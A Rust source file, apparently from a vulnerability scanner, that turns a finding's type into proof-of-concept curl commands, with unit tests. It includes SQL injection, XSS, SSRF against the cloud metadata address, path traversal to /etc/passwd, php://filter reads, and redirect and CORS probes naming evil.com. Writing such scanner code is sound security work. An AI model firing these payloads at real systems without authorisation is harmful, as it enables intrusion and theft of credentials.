use aegis_core::types::Finding;

#[derive(Debug, Clone, serde::Serialize)]
pub struct GeneratedPoC {
    pub finding_id: String,
    pub title: String,
    pub curl_commands: Vec<String>,
    pub description: String,
}

/// Generate PoC curl commands from a finding based on its type.
pub fn generate_poc(finding: &Finding, endpoint: &str) -> GeneratedPoC {
    let lower = finding.title.to_lowercase();
    let curl_cmds = match () {
        _ if lower.contains("sql") => {
            vec![
                format!("curl -s '{}?id=1'", endpoint),
                format!(
                    "curl -s '{}?id=1%27%20OR%20%271%27%3D%271'",
                    endpoint
                ),
                format!(
                    "curl -s '{}?id=1%27%20UNION%20SELECT%201%2C2%2C3--'",
                    endpoint
                ),
            ]
        }
        _ if lower.contains("xss") || lower.contains("cross-site") => {
            vec![
                format!("curl -s '{}?q=<script>alert(1)</script>'", endpoint),
                format!(
                    "curl -s '{}?q=<img%20src=x%20onerror=alert(1)>'",
                    endpoint
                ),
            ]
        }
        _ if lower.contains("ssrf") => {
            vec![
                format!(
                    "curl -s '{}?url=http://169.254.169.254/latest/meta-data/'",
                    endpoint
                ),
                format!(
                    "curl -s '{}?url=http://127.0.0.1:8080/admin'",
                    endpoint
                ),
            ]
        }
        _ if lower.contains("lfi") || lower.contains("path traversal") => {
            vec![
                format!(
                    "curl -s --path-as-is '{}/../../../etc/passwd'",
                    endpoint
                ),
                format!("curl -s '{}/../../../etc/passwd'", endpoint),
                format!(
                    "curl -s '{}?file=php://filter/convert.base64-encode/resource=config'",
                    endpoint
                ),
            ]
        }
        _ if lower.contains("idor") || lower.contains("insecure direct") => {
            vec![
                format!("curl -s '{}' -H 'Cookie: session=...'", endpoint),
                format!("curl -s '{}' | python3 -m json.tool", endpoint),
            ]
        }
        _ if lower.contains("redirect") || lower.contains("open redirect") => {
            vec![format!(
                "curl -s -v '{}?redirect=https://evil.com' 2>&1 | grep -i location",
                endpoint
            )]
        }
        _ if lower.contains("cors") => {
            vec![format!(
                "curl -s -H 'Origin: https://evil.com' -H 'Referer: https://evil.com/' {} | head -20",
                endpoint
            )]
        }
        _ => {
            vec![format!("curl -s '{}'", endpoint)]
        }
    };

    let desc = if curl_cmds.is_empty() {
        "No PoC available — manual testing required.".into()
    } else {
        format!(
            "Run the following command{} to reproduce:",
            if curl_cmds.len() > 1 { "s" } else { "" }
        )
    };

    GeneratedPoC {
        finding_id: finding.id.clone(),
        title: finding.title.clone(),
        curl_commands: curl_cmds,
        description: desc,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use aegis_core::types::{Finding, Severity};
    use chrono::Utc;

    fn make_finding(title: &str, severity: Severity) -> Finding {
        Finding {
            id: "test".into(),
            service_id: None,
            endpoint_id: None,
            title: title.into(),
            severity,
            confidence: 80,
            description: "".into(),
            evidence: None,
            cve: None,
            edb_id: None,
            remediation: None,
            discovered_at: Utc::now(),
        }
    }

    #[test]
    fn test_sqli_poc() {
        let poc = generate_poc(
            &make_finding("SQL Injection", Severity::Critical),
            "https://target.com/api/users",
        );
        assert!(!poc.curl_commands.is_empty());
        assert_eq!(poc.title, "SQL Injection");
        assert!(poc.curl_commands.len() >= 3);
    }

    #[test]
    fn test_xss_poc() {
        let poc = generate_poc(
            &make_finding("Stored XSS", Severity::High),
            "https://target.com/search",
        );
        assert!(poc.curl_commands[0].contains("script"));
    }

    #[test]
    fn test_ssrf_poc() {
        let poc = generate_poc(
            &make_finding("SSRF", Severity::High),
            "https://target.com/fetch",
        );
        assert!(poc.curl_commands[0].contains("169.254"));
    }

    #[test]
    fn test_lfi_poc() {
        let poc = generate_poc(
            &make_finding("LFI in download", Severity::High),
            "https://target.com/download",
        );
        assert!(poc.curl_commands.iter().any(|c| c.contains("passwd")));
    }
}
